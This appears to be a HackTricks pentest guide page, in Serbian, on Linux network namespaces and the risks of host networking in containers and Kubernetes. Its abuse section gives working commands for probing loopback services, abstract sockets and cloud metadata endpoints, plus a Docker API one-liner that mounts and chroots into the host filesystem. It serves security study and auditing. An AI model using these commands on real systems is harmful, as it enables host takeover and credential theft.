# Network Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Pregled

Network namespace izoluje resurse povezane sa mrežom, kao što su interfejsi, IP adrese, routing tabele, ARP/neighbor stanje, firewall pravila, socket-i, apstraktni socket namespace UNIX domena i sadržaj fajlova kao što je `/proc/net`. Zbog toga container može imati ono što izgleda kao sopstveni `eth0`, sopstvene lokalne rute i sopstveni loopback uređaj, a da pritom ne poseduje stvarni network stack hosta.

Sa stanovišta bezbednosti, ovo je važno zato što se mrežna izolacija odnosi na mnogo više od bindovanja portova. Privatni network namespace ograničava šta workload može direktno da posmatra ili rekonfiguriše. Kada se taj namespace podeli sa hostom, container može iznenada dobiti vidljivost nad listener-ima na hostu, lokalnim servisima hosta, apstraktnim AF_UNIX endpoint-ima i tačkama za kontrolu mreže koje nikada nisu bile namenjene izlaganju aplikaciji.

## Operacija

Novokreirani network namespace počinje sa praznim ili gotovo praznim mrežnim okruženjem sve dok mu se ne pripoje interfejsi. Container runtime-i zatim kreiraju ili povezuju virtualne interfejse, dodeljuju adrese i konfigurišu rute kako bi workload imao očekivanu konektivnost. U deployment-ima zasnovanim na bridge-u, to obično znači da container vidi interfejs zasnovan na veth-u, povezan sa bridge-om na hostu. U Kubernetes-u, CNI plugin-i obavljaju ekvivalentno podešavanje za Pod networking.

Ova arhitektura objašnjava zašto su `--network=host` ili `hostNetwork: true` tako drastična promena. Umesto da dobije pripremljen privatni network stack, workload se pridružuje stvarnom network stack-u hosta.

## Lab

Gotovo prazan network namespace možete videti pomoću:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
A možete uporediti normalne kontejnere i kontejnere koji koriste host network sa:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Kontejner sa host mrežom više nema sopstveni izolovani prikaz socket-a i interfejsa. Sama ta promena je već značajna, čak i pre nego što proverite koje capabilities proces ima.

## Upotreba runtime-a

Docker i Podman obično kreiraju privatni network namespace za svaki kontejner, osim ako nisu drugačije konfigurisani. Kubernetes obično svakom Pod-u dodeljuje sopstveni network namespace, koji dele kontejneri unutar tog Pod-a, ali koji je odvojen od hosta. To znači da je `127.0.0.1` obično lokalni za Pod, a ne za kontejner: listener vezan samo za localhost u jednom kontejneru obično je dostupan njegovim sidecar i susednim kontejnerima. Incus/LXC sistemi takođe pružaju bogatu izolaciju zasnovanu na network namespace-ovima, često sa širim izborom virtuelnih mrežnih podešavanja.

Zajednički princip je da je privatno umrežavanje podrazumevana granica izolacije, dok je host umrežavanje eksplicitno isključivanje te granice.

## Pogrešne konfiguracije

Najvažnija pogrešna konfiguracija je jednostavno deljenje host network namespace-a. To se ponekad radi zbog performansi, low-level monitoringa ili praktičnosti, ali se time uklanja jedna od najčistijih dostupnih granica između kontejnera. Listener-i dostupni na hostu postaju direktnije dostupni, servisi dostupni samo preko localhost-a mogu postati pristupačni, a capabilities kao što su `CAP_NET_ADMIN` ili `CAP_NET_RAW` postaju mnogo opasnije jer se operacije koje omogućavaju sada primenjuju na sopstveno mrežno okruženje hosta.

Drugi problem je prekomerno dodeljivanje network-related capabilities čak i kada je network namespace privatan. Privatni namespace pomaže, ali ne čini raw socket-e ili naprednu kontrolu mreže bezopasnim.

U Kubernetes-u, `hostNetwork: true` takođe menja koliko se možete osloniti na network segmentation na nivou Pod-a. Kubernetes navodi da mnogi network plugin-ovi ne mogu pravilno da razlikuju saobraćaj iz `hostNetwork` Pod-a pri `podSelector` / `namespaceSelector` uparivanju i zato ga tretiraju kao običan saobraćaj node-a. Iz ugla napadača, to znači da kompromitovani workload sa `hostNetwork` često treba tretirati kao network foothold na nivou node-a, a ne kao običan Pod koji je i dalje ograničen istim pretpostavkama policy-ja kao workload-i na overlay mreži.

## Zloupotreba

U slabo izolovanim podešavanjima, napadači mogu pregledati listening servise hosta, pristupiti management endpoint-ima vezanim samo za loopback, prisluškivati saobraćaj ili ometati saobraćaj u zavisnosti od konkretnih capabilities i okruženja, ili promeniti routing i stanje firewall-a ako je prisutan `CAP_NET_ADMIN`. U cluster-u to takođe može olakšati lateral movement i reconnaissance control plane-a.

Ako sumnjate na host umrežavanje, počnite potvrđivanjem da vidljivi interfejsi i listener-i pripadaju hostu, a ne izolovanoj mreži kontejnera:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Servisi dostupni samo preko loopback interfejsa često su prvo zanimljivo otkriće:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Apstraktni UNIX socketi su još jedna meta koju je lako prevideti, jer su ograničeni opsegom mrežnog namespace-a, iako ne izgledaju kao TCP/UDP listeneri i možda ne postoje kao putanje u filesystemu ispod `/run`. Container sa host mrežom zato može naslediti pristup kontrolnim kanalima koji su dostupni samo hostu, a koji nikada nisu ni bind-mountovani u container:
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
Istorijski primer bila je greška u izlaganju apstraktnog socket-a `containerd-shim`, ali šira pouka je važnija od konkretnog CVE-a: kada se workload pridruži host network namespace-u, apstraktni AF_UNIX servisi takođe postaju deo attack surface-a. Ako ti socket-i deluju povezano sa runtime-om ili administracijom, pređi na [Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md).

Ako su prisutne network capabilities, proveri da li workload može da pregleda ili menja vidljivi stack:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Na modernim kernelima, host networking zajedno sa `CAP_NET_ADMIN` može takođe da izloži putanju paketa izvan prostih izmena na `iptables` / `nftables`. `tc` qdiscs i filteri su takođe ograničeni na namespace, pa se u deljenom host network namespace-u primenjuju na host interfejse koje container može da vidi. Ako je dodatno prisutan i `CAP_BPF`, relevantni postaju i eBPF programi povezani sa mrežom, kao što su TC i XDP loaderi:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Ovo je važno zato što napadač može da mirror-uje, preusmerava, oblikuje ili odbacuje saobraćaj na nivou interfejsa hosta, a ne samo da menja firewall rules. U privatnom network namespace-u te radnje su ograničene na prikaz kontejnera; u deljenom host namespace-u one utiču na host.

U cluster ili cloud okruženjima, host networking takođe opravdava brzi lokalni recon metadata servisa i servisa bliskih control plane-u:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
U Kubernetes-u, imajte na umu da kompromitovanje **bilo kog** container-a u multi-container Pod-u takođe omogućava pristup localhost listener-ima koje su otvorili sibling container-i i sidecar-i, jer ceo Pod deli jedan network namespace. Ovo je naročito relevantno kod service-mesh, observability i helper container-a čiji su admin ili debug interfejsi namerno dostupni samo unutar Pod-a, a ne na nivou celog klastera:
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
Tretirajte „bound to localhost“ kao **Pod-private**, a ne kao **container-private**. Nakon što je jedan container u Pod-u kompromitovan, ta pretpostavka više ne važi.

### Potpuni primer: Host Networking + Local Runtime / Kubelet Access

Host networking ne obezbeđuje automatski root pristup hostu, ali često izlaže servise koji su namerno dostupni samo sa samog node-a. Ako je neki od tih servisa slabo zaštićen, host networking postaje direktan put za privilege-escalation.

Docker API na localhost-u:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet na localhostu:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Uticaj:

- direktna kompromitacija hosta ako je lokalni runtime API izložen bez odgovarajuće zaštite
- izviđanje clustera ili lateralno kretanje ako su kubelet ili lokalni agenti dostupni
- manipulacija saobraćajem ili uskraćivanje usluge u kombinaciji sa `CAP_NET_ADMIN`

## Provere

Cilj ovih provera je da utvrdite da li proces ima privatni network stack, koje su rute i listeneri vidljivi i da li prikaz mreže već izgleda kao na hostu pre nego što uopšte testirate capabilities.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
Šta je ovde zanimljivo:

- Ako `/proc/self/ns/net` i `/proc/1/ns/net` već izgledaju kao host, kontejner možda deli host network namespace ili neki drugi namespace koji nije privatan.
- `lsns -t net` i `ip netns identify` su korisni kada je shell već unutar imenovanog ili persistent namespace-a i želite da ga povežete sa objektima u `/run/netns` sa host strane.
- `ss -lntup` je naročito vredan jer otkriva listenere ograničene samo na loopback i lokalne management endpointe. `ss -xap` i `/proc/net/unix` dodaju prikaz abstract socket-a koji uobičajene pretrage socket-a u filesystem-u ne obuhvataju.
- Rute, nazivi interfejsa, firewall kontekst, `tc` stanje i eBPF attachments postaju mnogo važniji ako su prisutni `CAP_NET_ADMIN`, `CAP_NET_RAW` ili `CAP_BPF`.
- U Kubernetes-u, neuspešna rezolucija service name-a iz `hostNetwork` Pod-a može jednostavno značiti da Pod ne koristi `dnsPolicy: ClusterFirstWithHostNet`, a ne da service ne postoji.
- U multi-container Pod-ovima, localhost listeneri pripadaju celom Pod network namespace-u, zato proverite sidecar-e i sibling kontejnere pre nego što pretpostavite da je port ograničen samo na loopback i nedostupan iz kompromitovanog kontejnera.

Prilikom pregleda kontejnera, uvek procenite network namespace zajedno sa skupom capabilities. Host networking sa snažnim network capabilities je potpuno drugačiji security posture od bridge networking-a sa uskim podrazumevanim skupom capabilities.

## Reference

- [Kubernetes NetworkPolicy i `hostNetwork` napomene](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [Linux `network_namespaces(7)` i izolacija abstract UNIX socket-a](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [containerd advisory: abstract Unix domain socket-i izloženi host-network kontejnerima](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [eBPF token i capability zahtevi za network-related eBPF programe](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
